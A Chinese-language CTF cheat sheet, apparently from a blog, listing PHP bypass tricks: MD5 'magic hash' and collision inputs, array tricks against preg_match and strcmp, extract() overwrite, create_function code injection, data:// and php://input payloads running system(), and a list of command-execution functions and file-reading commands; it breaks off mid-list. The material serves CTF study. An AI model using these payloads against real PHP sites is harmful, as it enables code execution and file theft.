<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$num</span>;</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;flag&#123;**********&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接传 <strong>num = 1abc</strong> 即可</p>
<h4 id="MD5弱比较"><a href="#MD5弱比较" class="headerlink" title="MD5弱比较"></a><strong>MD5弱比较</strong></h4><p><strong>MD5 信息摘要算法</strong>是一种被广泛使用的密码散列函数，可以产生出一个 128 位（16字节）的散列值用于确保信息传输完整一致。而 PHP 在处理哈希字符串时，“0e” 开头的值利用 “==” 判断相等时会被视为 0。所以如果两个不同的密码经过哈希以后，其哈希值都是以 ”0E” 开头的，那么 PHP 将会认为他们相同，这就是所谓的 <strong>MD5 碰撞漏洞</strong></p>
<p>因为当hash开头为0e后全为数字的话，进行比较时就会将其当做科学计数法来计算，用计算出的结果来进行比较</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5($str1)=0e420233178946742799316739797882</span><br><span class="line">md5($str2) == &#x27;0&#x27;	//true</span><br></pre></td></tr></table></figure>
<p>这里给出以下两段字符串，用于绕过MD5的弱比较，</p>
<p>常见形式：md5($a) == md5($b) &amp;&amp; $a !== $b</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br></pre></td></tr></table></figure>
<h4 id="MD5弱比较（分别为数字和字母）"><a href="#MD5弱比较（分别为数字和字母）" class="headerlink" title="MD5弱比较（分别为数字和字母）"></a>MD5弱比较（分别为数字和字母）</h4><p>比如看到以下类似的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctype</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]);</span><br><span class="line">    <span class="variable">$is_num</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$ctype</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$is_num</span>) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$ctype</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$is_num</span>)) &#123;</span><br><span class="line">        <span class="variable">$checker_2</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中 <code>ctype_alpha()</code> 是检查是不是纯字母的</p>
<p>这里我们可以用以下来绕过（下面是倒置过的）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OZDCKNQ</span><br><span class="line">807016042</span><br></pre></td></tr></table></figure>
<p>没倒置的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">md5加密之后前两位为0e 的纯数字:</span><br><span class="line">240610708  314282422   571579406   903251147</span><br><span class="line">md5加密之后前两位为0e 的纯字母:</span><br><span class="line">QLTHNDT   QNKCDZO    EEIZDOI   TUFEPMC</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/5059">[NSSRound#16 Basic]了解过PHP特性吗 | NSSCTF</a></p>
<h4 id="MD5强碰撞"><a href="#MD5强碰撞" class="headerlink" title="MD5强碰撞"></a>MD5强碰撞</h4><p>遇到 <strong>md5($_GET[‘username’]) === md5($_GET[‘password’])</strong></p>
<p>你让</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a[] = 1</span><br><span class="line">b[] = 1</span><br></pre></td></tr></table></figure>
<p>因为hash解析不了数组，会直接返回NULL，这样两边都是NULL，也是能返回true的</p>
<p><strong>string转换后的md5强比较</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//here is level 2</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;str.php&quot;;</span><br><span class="line">if (isset($_POST[&#x27;array1&#x27;]) &amp;&amp; isset($_POST[&#x27;array2&#x27;]))&#123;</span><br><span class="line">    $a1 = (string)$_POST[&#x27;array1&#x27;];</span><br><span class="line">    $a2 = (string)$_POST[&#x27;array2&#x27;];</span><br><span class="line">    if ($a1 == $a2)&#123;</span><br><span class="line">        die(&quot;????&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (md5($a1) === md5($a2))&#123;</span><br><span class="line">        echo $level3;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;level 2 failed ...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>array1[]=1&amp;array2[]=2本来觉得数组绕过就可以可是，发现输出了????</p>
<p>原因是php的数组在进行string强制转换时，会将数组转换为NULL类型 null=null就成立了，没绕过去</p>
<p>所以我们需要一个，<strong>md5前不相等，而md5后全等的</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;array2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
<h4 id="SHA1强碰撞"><a href="#SHA1强碰撞" class="headerlink" title="SHA1强碰撞"></a>SHA1强碰撞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>
<p>直接上这个就可以，记得改一下变量名字</p>
<h4 id="要求MD5和SHA1分别相等"><a href="#要求MD5和SHA1分别相等" class="headerlink" title="要求MD5和SHA1分别相等"></a>要求MD5和SHA1分别相等</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = 1</span><br><span class="line">b = &#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">a = 0</span><br><span class="line">b = 0E1</span><br></pre></td></tr></table></figure>
<p>Error类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$c-&gt;a=new Error(&quot;a&quot;,1);$c-&gt;b=new Error(&quot;a&quot;,2)</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[极客大挑战 2020]Greatphp">BUUCTF在线评测</a> </p>
<h4 id="URL二次编码绕过"><a href="#URL二次编码绕过" class="headerlink" title="URL二次编码绕过"></a>URL二次编码绕过</h4><p>题目的源码如下，首先题目需要输入变量 id，且变量 id 不能包含字符串 “hackerDJ”。接着使用 urldecode() 函数进行 url 解码，需要令解码后的字符串等于 “hackerDJ”</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Copy Highlighter-hljs<span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">eregi</span>(<span class="string">&quot;hackerDJ&quot;</span>,<span class="variable">$_GET</span>[id])) &#123;</span><br><span class="line">      <span class="keyword">echo</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">      <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;hackerDJ&quot;</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Access granted!&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在 URL 编辑框中可以使用 URL-encode 来替代字符，例如 “h” 的 URL 编码是 “%68”，此时输入 “%68ackerDJ” 等同于输入 “hackerDJ”。由于源码会使用 urldecode() 函数进行 url 解码，因此可以对 “%68ackerDJ” 进行 url 编码，让传入的字符串通过第一个条件语句，在解码之后通过第二个分支语句。所以提交的 payload 应该是 “%68ackerDJ” 的 URL 编码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span> = %2568ackerDJ</span><br></pre></td></tr></table></figure>
<h3 id="数组绕过正则匹配"><a href="#数组绕过正则匹配" class="headerlink" title="数组绕过正则匹配"></a>数组绕过正则匹配</h3><p>PHP中正则函数（如<code>preg_match()</code>）会将数组参数转换为字符串“Array”，这使得数组可绕过正则匹配</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z]+$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Valid input&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Invalid input&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>构造payload</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input[]=test</span><br></pre></td></tr></table></figure>
<p><code>preg_match()</code>将其转为字符串“Array”，从而绕过正则检测</p>
<h3 id="extract覆盖漏洞"><a href="#extract覆盖漏洞" class="headerlink" title="extract覆盖漏洞"></a>extract覆盖漏洞</h3><p><code>extract()</code>函数用于将数组元素导入当前符号表，若数组由外部输入控制，可能导致变量覆盖</p>
<p><strong>原因</strong>： <code>extract()</code>未对输入数组进行充分过滤，攻击者可构造恶意数组覆盖现有变量</p>
<p><strong>应用</strong>：在代码中使用<code>extract()</code>处理外部可控数组时，攻击者可覆盖关键变量，改变程序逻辑</p>
<p><strong>示例代码</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;original&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>构造payload</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data[]=a&amp;data[]=hacked</span><br></pre></td></tr></table></figure>
<p>这样，<code>extract()</code>将<code>data</code>数组元素导入符号表，覆盖了变量<code>$a</code>，使其变为“hacked”</p>
<h3 id="数组绕过strcmp比较"><a href="#数组绕过strcmp比较" class="headerlink" title="数组绕过strcmp比较"></a>数组绕过strcmp比较</h3><p><code>strcmp()</code>函数比较两个字符串，若参数类型不同会进行类型转换，数组转为NULL，比较时NULL与空字符串视为相等</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>], <span class="string">&#x27;secret&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Access granted&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Access denied&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>构造payload</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input[]=secret</span><br></pre></td></tr></table></figure>
<p><code>$_GET[&#39;input&#39;]</code>是数组，<code>strcmp()</code>将其转为NULL，与空字符串比较返回0，导致验证被绕过</p>
<h3 id="creat-function-代码注入"><a href="#creat-function-代码注入" class="headerlink" title="creat_function()代码注入"></a>creat_function()代码注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">creat_function函数根据传递的参数创建匿名函数，并为其返回唯一名称</span><br><span class="line">语法：</span><br><span class="line">create_function(string $args,string $code)</span><br><span class="line">string $args 声明的函数变量部分</span><br><span class="line"></span><br><span class="line">string $code 执行的方法代码部分</span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$newfunc</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="string">&#x27;return $a + $b;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>那么相当于创建了一个函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function newfunc($a,$b)&#123;</span><br><span class="line">	return $a + $b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>好了，明白了以上原理，来看以下注入代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;echo &#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line"><span class="variable">$ft</span> = <span class="title function_ invoke__">creat_function</span>(<span class="string">&#x27;$id&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$ft</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面代码的意思就是创建了以下函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function ft($id)&#123;</span><br><span class="line">	echo $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果你给 <code>id</code> 赋值 <code>;&#125;phpinfo();/*</code>，相当于把前面的函数提前闭合而后面又执行一个phpinfo()，从而达到一个RCE的效果</p>
<p><strong>PS：</strong>从 PHP 7.2.0 开始，<code>create_function</code> 被废弃，在 PHP 8.0.0 中，该函数已被删除</p>
<h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><p><img src="/img/lazy.gif" data-original="https://i-blog.csdnimg.cn/blog_migrate/f4f460a7e99d561e19b63142a1cf9751.png" alt="img"></p>
<h4 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a><strong>data伪协议</strong></h4><p><code>data://[&lt;MIME-type&gt;][;charset=][;base64],&lt;data&gt;</code></p>
<ul>
<li><strong>MIME-type：</strong>指定数据的类型，默认是 text/plain。</li>
<li><strong>charset：</strong>指定数据的编码类型，如 utf-8。</li>
<li><strong>base64：</strong>如果使用 Base64 编码，则加上该标识。</li>
<li><strong>data：</strong>实际的数据内容。</li>
</ul>
<p><strong>text/plain 的具体含义</strong></p>
<p><strong>text/plain MIME 类型：</strong></p>
<ol>
<li>表示数据是普通文本文件，没有任何特定的格式或编码。</li>
<li>在 PHP 的文件包含漏洞中，当使用 data://text/plain 时，PHP 会将数据视为纯文本进行读取。</li>
<li>但是，如果该文本数据本身是 PHP 代码（如<code>&lt;?php system(&#39;ls&#39;); ?&gt;</code>），且它被 include()、require() 等函数加载，那么它会被当作 PHP 代码解析和执行。</li>
</ol>
<p><strong>data://text/plain 的实际作用</strong></p>
<p>在 LFI 漏洞中使用 data://text/plain 可以让我们通过 URL 注入 PHP 代码，并且这些代码会在服务器端执行。</p>
<p><strong>示例：执行系统命令</strong></p>
<p><strong>URL：</strong></p>
<p><code>?file=data://text/plain,&lt;?php system(&#39;ls&#39;); ?&gt;</code></p>
<p><strong>解释：</strong></p>
<ul>
<li>data:// 告诉 PHP 加载内联数据。</li>
<li>text/plain 表示数据是纯文本类型，但在通过 include() 加载时，PHP 会解析文本中的代码片段（如 <code>&lt;?php system(&#39;ls&#39;); ?&gt;</code>），并将其执行。</li>
</ul>
<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">?file=php://filter/convert.base64-encode/index/resource=flag(.php)有时候不需要括号</span><br></pre></td></tr></table></figure>
<p>或者可以用UTF-7</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.iconv.UTF-8.UTF-7/resource=flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;+ADw?php +ACQ-flag+AD0&#x27;cyberpeace+AHs-79013c3265f804bbbd60aedc255313f3+AH0&#x27;+ADs&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里的a放回显出来的内容</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UTF-7,&quot;</span>UTF-<span class="number">8</span><span class="string">&quot;,<span class="subst">$a</span>);</span></span><br><span class="line"><span class="string">echo(<span class="subst">$b</span>);</span></span><br></pre></td></tr></table></figure>
<h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?a=<span class="keyword">include</span><span class="variable">$_GET</span>[x]&amp;x=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -lah&quot;</span>)<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//&lt;?php system(&quot;tac flag.php&quot;)?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="RCE（Php）"><a href="#RCE（Php）" class="headerlink" title="RCE（Php）"></a>RCE（Php）</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xinghaihe/p/18723674">RCE（远程代码执行漏洞）函数&amp;命令&amp;绕过总结 - 星海河 - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hello-there/p/12880566.html">以一道CTF题目看无参数RCE - 泠涯 - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2393421">CTF中的RCE绕过-腾讯云开发者社区-腾讯云</a></p>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>RCE，即<strong>远程代码执行</strong>（Remote Code Execution），远程命令/代码执行漏洞，简称为RCE漏洞，可以直接向服务器后台远程注入操作系统的命令或者代码，从而拿到服务器后台的权限。RCE分为远程执行命令（执行ping命令）和远程代码执行eval</p>
<p><strong>RCE命令注入分类</strong></p>
<ul>
<li>无过滤</li>
<li>过滤cat</li>
<li>过滤空格</li>
<li>过滤目录分隔符</li>
<li>过滤运算符</li>
<li>综合过滤练习</li>
</ul>
<h3 id="RCE绕过指南"><a href="#RCE绕过指南" class="headerlink" title="RCE绕过指南"></a>RCE绕过指南</h3><h4 id="命令绕过"><a href="#命令绕过" class="headerlink" title="命令绕过"></a>命令绕过</h4><p><strong>命令执行函数：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system()               输出并返回最后一行shell结果。</span><br><span class="line">exec()                 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。</span><br><span class="line">passthru()             只调用命令，把命令的运行结果原样地直接输出到标准输出设备上//替换system</span><br><span class="line">echo+``                ?c=echo `tac flag.php`;</span><br><span class="line">shell_exec()</span><br><span class="line">popen()/proc_open()</span><br><span class="line">print(`cat /flag`)</span><br></pre></td></tr></table></figure>
<p><strong>输出函数：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ls      列出目录并输出</span><br><span class="line">cat     由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac     从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">nl      类似于cat -n，显示时输出行号</span><br><span class="line">more    根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less    和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head    只显示头几行</span><br><span class="line">tail    只显示最后几行</span><br><span class="line">sort    文件内容进行行间的排序并输出文本 sort flag.php</span><br><span class="line">vim     一种编辑器，这个也可以查看</span><br><span class="line">od      以二进制的方式读取档案内容</span><br><span class="line">vi      一种编辑器 vi flag.php</span><br><span class="line">strings  在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</span><br><span class="line">paste	把每个文件以列对列的方式，一列列地加以合并 </span><br><span class="line">grep	查询文件中包含某个特定字符串的行并输出 grep &#x27;fla&#x27; flag.php</span><br><span class="line">sed		一种编辑器，可以用sed -f flag.php读取flag (sed也可以用来删除特定字符)</span><br><span class="line">rev     反转</span><br><span class="line">uniq    删除文件重复行并输出剩余内容，可以用于文件读取。与cat一样，结果在源代码</span><br><span class="line">base64  可以读取flag.php并编码后输出 (/bin/base64)base64 flag.php</span><br><span class="line">mv      对文件进行重命名，通过修改后缀名为txt，可以直接在网页中访问txt文件 mv f?lg.php a.txt</span><br><span class="line">cp      将flag的内容复制到1.txt上，然后访问/1.txt文件读取 cp flag.php 1.txt</span><br><span class="line">awk     awk &#x27;&#123;print&#125;&#x27; /fla*  打印`/` 目录下所有以 `fla` 开头的文件中的每一行内容</span><br><span class="line">assert 